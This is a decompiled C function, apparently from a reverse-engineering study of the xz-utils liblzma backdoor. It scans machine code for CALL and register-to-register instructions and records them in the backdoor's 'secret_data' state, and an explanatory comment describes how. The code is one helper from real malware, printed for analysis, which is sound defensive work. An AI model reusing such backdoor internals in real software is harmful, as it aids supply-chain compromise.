// /home/kali/xzre-ghidra/xzregh/10AA00_secret_data_append_from_code.c
// Function: secret_data_append_from_code @ 0x10AA00
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_append_from_code(void * code_start, void * code_end, secret_data_shift_cursor_t shift_cursor, uint shift_count, BOOL start_from_call)


/*
 * AutoDoc: Sweeps a code range and feeds instructions to secret_data_append_from_instruction. When start_from_call is TRUE it first finds
 * the next CALL via find_call_instruction, then loops up to shift_count times, each time calling find_reg2reg_instruction to
 * locate a qualifying instruction and shifting the supplied cursor. Returning FALSE means it could not find enough instructions in
 * the provided span.
 */

#include "xzre_types.h"

BOOL secret_data_append_from_code
               (void *code_start,void *code_end,secret_data_shift_cursor_t shift_cursor,
               uint shift_count,BOOL start_from_call)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  ulong uVar4;
  secret_data_shift_cursor_t local_9c [3];
  dasm_ctx_t local_90;
  
  pdVar3 = &local_90;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)&pdVar3->instruction = 0;
    pdVar3 = (dasm_ctx_t *)((long)&pdVar3->instruction + 4);
  }
  local_9c[0] = shift_cursor;
  if (start_from_call != FALSE) {
    BVar1 = find_call_instruction((u8 *)code_start,(u8 *)code_end,(u8 *)0x0,&local_90);
    if (BVar1 == FALSE) {
      return FALSE;
    }
    code_start = local_90.instruction + local_90.instruction_size;
  }
  uVar4 = 0;
  do {
    BVar1 = find_reg2reg_instruction((u8 *)code_start,(u8 *)code_end,&local_90);
    if (BVar1 == FALSE) {
LAB_0010aa80:
      return (uint)(shift_count == (uint)uVar4);
    }
    if (uVar4 == shift_count) {
      if (shift_count < (uint)uVar4) {
        return FALSE;
      }
      goto LAB_0010aa80;
    }
    uVar4 = uVar4 + 1;
    BVar1 = secret_data_append_from_instruction(&local_90,local_9c);
    if (BVar1 == FALSE) {
      return FALSE;
    }
    code_start = local_90.instruction + local_90.instruction_size;
  } while( TRUE );
}

